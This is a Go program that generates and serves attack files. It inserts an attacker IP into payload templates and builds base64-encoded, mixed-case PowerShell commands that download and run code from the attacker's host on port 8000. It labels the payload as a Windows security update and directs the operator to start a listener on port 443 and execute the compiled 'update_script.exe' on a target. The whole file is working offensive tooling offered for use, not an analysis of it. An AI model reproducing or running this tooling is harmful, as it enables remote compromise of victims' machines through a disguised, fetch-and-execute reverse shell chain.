package main

import (
	"fmt"
	"strings"
	"os"
	"encoding/base64"
	"net/http"
	"log"
	"bufio"
)

func loggingFileServer(w http.ResponseWriter, r *http.Request, fileServer http.Handler) {
	// Log request details
	log.Printf("%s %s %s\n", r.RemoteAddr, r.Method, r.URL)

	// Serve the requested file using original file server
	fileServer.ServeHTTP(w, r)
}

func main() {

	// Get LHOST IP from command line arg 1
	LHOST := os.Args[1]
	LPORT := "443"
	fmt.Println("LHOST:    ", LHOST)
	fmt.Println("LPORT:    ", LPORT)

	// Modify "update_script.go", adding LHOST IP
	updateScript, err := os.ReadFile("update_script.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Convert the byte array to a string
	updateScriptStr := string(updateScript)

	// Set the LHOST IP
	modifiedUpdateScript := strings.ReplaceAll(updateScriptStr, "XXXXX", LHOST)

	// Write the modified content back to the file
	err = os.WriteFile("update_script.go", []byte(modifiedUpdateScript), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}


	// Modify "r1", adding LHOST IP
	r1, err := os.ReadFile("r1.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Convert the byte array to a string
	r1Str := string(r1)

	// Set the LHOST IP
	r1Modified := strings.ReplaceAll(r1Str, "XXXXX", LHOST)

	// Write the modified content back to the file
	err = os.WriteFile("r1", []byte(r1Modified), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}


	// Modify "WinSecurityUpdate" with 'a1' and 'r1' base64
	WinSecUpdate, err := os.ReadFile("WinSecUp.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Convert the byte array to a string
	WinSecUpdateStr := string(WinSecUpdate)

	// Base64 encode the following string
	a1PowerShell := "InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://" + LHOST + ":8000/a1')"
	a1Encoded := base64.StdEncoding.EncodeToString([]byte(a1PowerShell))
	// Replace 'A1BASE64' with contents of LHOST
	WinSecUpdateA1Modified := strings.ReplaceAll(WinSecUpdateStr, "A1BASE64", a1Encoded)

	// Write the modified content back to the file
	err = os.WriteFile("WinSecUp", []byte(WinSecUpdateA1Modified), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}


	WinSecUpdate2, err := os.ReadFile("WinSecUp")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Convert the byte array to a string
	WinSecUpdateStr2 := string(WinSecUpdate2)

	// Base64 encode the following string
	r1PowerShell := "InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://" + LHOST + ":8000/r1')"
	r1Encoded := base64.StdEncoding.EncodeToString([]byte(r1PowerShell))
	// Replace 'A1BASE64' with contents of LHOST
	WinSecUpdateA1Modified2 := strings.ReplaceAll(WinSecUpdateStr2, "R1BASE64", r1Encoded)

	// Write the modified content back to the file
	err = os.WriteFile("WinSecUp", []byte(WinSecUpdateA1Modified2), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("******************************************")
	fmt.Println("[!] Start your listener on port 443")
	fmt.Printf("[!] Press ENTER to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')

	prompt := `
******************************************
[!] Attack files have been generated
******************************************
[-] update_script.go
[-] r1
[-] WinSecUp

******************************************
[!] HTTP Server is running on port 8000
[!] Press CTRL+C to Exit

******************************************`

	fmt.Println(prompt)

	// Define file server
	fileServer := http.FileServer(http.Dir("./"))

	// Create handler
  var handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    loggingFileServer(w, r, fileServer)
  })

	// Serve requests that start with '/'
  http.Handle("/", handler)

	fmt.Println("[!] Compile and Upload 'update_script.exe' to target and execute")
	fmt.Println("[!] Check Listener for connection\n")
	fmt.Println("******************************************")

	// Start server on port 8000
	log.Fatal(http.ListenAndServe(":8000", nil))

}
